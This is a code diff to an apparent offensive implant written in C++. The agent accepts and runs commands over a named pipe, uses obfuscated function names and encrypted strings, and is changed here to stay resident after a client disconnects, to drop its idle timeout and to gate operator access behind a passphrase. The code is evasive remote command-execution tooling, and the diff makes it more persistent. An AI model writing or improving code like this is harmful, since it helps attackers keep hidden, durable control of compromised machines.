@@ -1,6 +1,4 @@
-#include "obfuscation.h"
-#include "pipe_core.h"
-#include "command_executor.h"
+// Include platform headers first for debug logging
 #include <string>
 #include <vector>
 #include <ctime>
@@ -17,9 +15,8 @@
     #include <chrono>
 #endif
 
-namespace obf = obfuscated;
-
 // Debug logging functionality (conditionally compiled)
+// MUST be defined BEFORE including template headers so DEBUG_LOG_CAT is available
 #ifdef DEBUG_MODE
 class DebugLogger {
 private:
@@ -106,6 +103,13 @@ static DebugLogger g_debug_log;
 #define DEBUG_LOG_CAT(cat, msg)
 #endif
 
+// Now include template headers (DEBUG_LOG_CAT is available for use in headers)
+#include "obfuscation.h"
+#include "pipe_core.h"
+#include "command_executor.h"
+
+namespace obf = obfuscated;
+
 // Obfuscated function names using compile-time randomization
 #define MAIN_FUNC OBF_FUNC_NAME(main_entry_point)
 #define PIPE_HANDLER OBF_FUNC_NAME(handle_pipe_communication)
@@ -158,34 +162,26 @@ private:
     // Main command processing loop
     bool OBF_FUNC_NAME(process_commands)() {
         DEBUG_LOG_CAT("EXEC", "Entering command processing loop");
-        int empty_read_count = 0;
-        const int max_empty_reads = 300; // 300 * 100ms = 30 seconds timeout
 
         while (running) {
             auto request = pipe_handler.read_command();
             if (request.empty()) {
-                empty_read_count++;
-                DEBUG_LOG_CAT("EXEC", "Empty read, count: " + std::to_string(empty_read_count));
-
-                // If too many empty reads, assume client disconnected
-                if (empty_read_count >= max_empty_reads) {
-                    DEBUG_LOG_CAT("EXEC", "Client timeout - no data received");
-                    break; // Exit command loop and reconnect
+                // Check if connection is still valid
+                if (!pipe_handler.is_pipe_connected()) {
+                    DEBUG_LOG_CAT("EXEC", "Connection lost, exiting command loop");
+                    break;
                 }
+                // Keep waiting - no timeout
                 continue;
             }
 
-            // Reset counter on successful read
-            empty_read_count = 0;
-
             DEBUG_LOG_CAT("EXEC", "Received command: " + request.substr(0, 50) + (request.length() > 50 ? "..." : ""));
 
-            // Check for exit command
+            // Check for exit command (disconnects client but keeps agent running)
             if (request == AGENT_EXIT_CMD.decrypt()) {
-                DEBUG_LOG_CAT("EXEC", "Exit command received, shutting down");
-                running = false;
+                DEBUG_LOG_CAT("EXEC", "Exit command received, closing client connection");
                 pipe_handler.send_response(SUCCESS_MSG.decrypt());
-                break;
+                break;  // Break out of command loop, go back to waiting for connections
             }
 
             // Execute command and send response
@@ -211,12 +207,21 @@ public:
         DEBUG_LOG_CAT("MAIN", "Agent run() started");
         DEBUG_LOG_CAT("MAIN", "Pipe name: " + pipe_name);
 
-        // Initialize pipe communication
+        // Initialize pipe communication with authentication if passphrase is defined
         DEBUG_LOG_CAT("PIPE", "Initializing pipe communication");
-        if (!pipe_handler.initialize(pipe_name)) {
-            DEBUG_LOG_CAT("ERROR", "Failed to initialize pipe");
-            return 1;
-        }
+        #ifdef AGENT_PASSPHRASE
+            DEBUG_LOG_CAT("AUTH", "Passphrase authentication enabled");
+            if (!pipe_handler.initialize_with_passphrase(pipe_name, AGENT_PASSPHRASE, pipe_name.c_str())) {
+                DEBUG_LOG_CAT("ERROR", "Failed to initialize pipe with authentication");
+                return 1;
+            }
+        #else
+            DEBUG_LOG_CAT("AUTH", "No passphrase configured, XOR encoding only");
+            if (!pipe_handler.initialize(pipe_name)) {
+                DEBUG_LOG_CAT("ERROR", "Failed to initialize pipe");
+                return 1;
+            }
+        #endif
         DEBUG_LOG_CAT("PIPE", "Pipe initialized successfully");
 
         running = true;
@@ -262,8 +267,21 @@ public:
 
             DEBUG_LOG_CAT("PIPE", "Client connected successfully");
 
-            // Handshake already sent by wait_for_connection() in pipe_core.h line 199
-            // Don't send a second handshake here
+            // Handshake already sent by wait_for_connection() in pipe_core.h
+            // ACK message sent automatically
+
+            // Perform authentication if passphrase is configured
+            #ifdef AGENT_PASSPHRASE
+                DEBUG_LOG_CAT("AUTH", "Performing authentication handshake");
+                if (!pipe_handler.perform_authentication()) {
+                    DEBUG_LOG_CAT("ERROR", "Authentication failed, disconnecting client");
+                    pipe_handler.disconnect_client();
+                    continue;  // Wait for next connection
+                }
+                DEBUG_LOG_CAT("AUTH", "Authentication successful");
+            #else
+                DEBUG_LOG_CAT("AUTH", "No authentication configured - proceeding to command loop");
+            #endif
 
             // Process commands
             DEBUG_LOG_CAT("MAIN", "Starting command processing");
